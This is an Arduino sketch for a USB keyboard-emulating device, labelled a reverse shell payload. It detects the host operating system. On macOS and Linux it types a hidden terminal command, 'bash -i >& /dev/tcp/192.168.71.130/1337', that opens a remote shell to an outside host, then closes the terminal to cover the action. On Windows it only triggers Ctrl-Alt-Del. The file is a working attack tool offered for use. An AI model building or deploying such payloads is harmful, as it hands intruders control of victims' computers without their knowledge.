// Reverse Shell Payload
// Target OS: macOS / Linux

#include <Keyboard.h>
#include <HID.h>
#include <FingerprintUSBHost.h>

// Init function
void setup() {
  // Start Keyboard
  Keyboard.begin();

  //Detect Host OS
  String os;
  delay(1000);
  FingerprintUSBHost.guessHostOS(os);

  if (os == "MacOS") {
    mac();
  } else if (os == "Linux") {
    linux();
  } else if (os == "Windows") {
    windows();
  }
}

void mac() {
  delay(1000);
  // ⌘-Space
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  // Launch terminal
  Keyboard.print("terminal");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(500);

  // Create rsh
  Keyboard.print("bash -i >& /dev/tcp/192.168.71.130/1337 0>&1 & disown");
  delay(100);
  Keyboard.write(KEY_RETURN);
  delay(100);

  // Close terminal
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('q');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.write(KEY_RETURN);
}

void linux() {
  delay(1000);
  // Super
  Keyboard.write(KEY_LEFT_GUI);
  delay(100);

  // Launch terminal
  Keyboard.print("terminal");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(500);

  // Create rsh
  Keyboard.print("bash -i >& /dev/tcp/192.168.71.130/1337 0>&1 & disown");
  delay(100);
  Keyboard.write(KEY_RETURN);
  delay(100);

  // Close terminal
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(100);
  Keyboard.releaseAll();
}

void windows() {
  Keyboard.write(KEY_LEFT_GUI);
  delay(100);
  Keyboard.print("Hello");
  delay(1500);
  
  // Ctrl-Alt-Del
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_DELETE);
  delay(100);
  Keyboard.releaseAll();
  delay(100);
}

void loop() {}  // Do not use
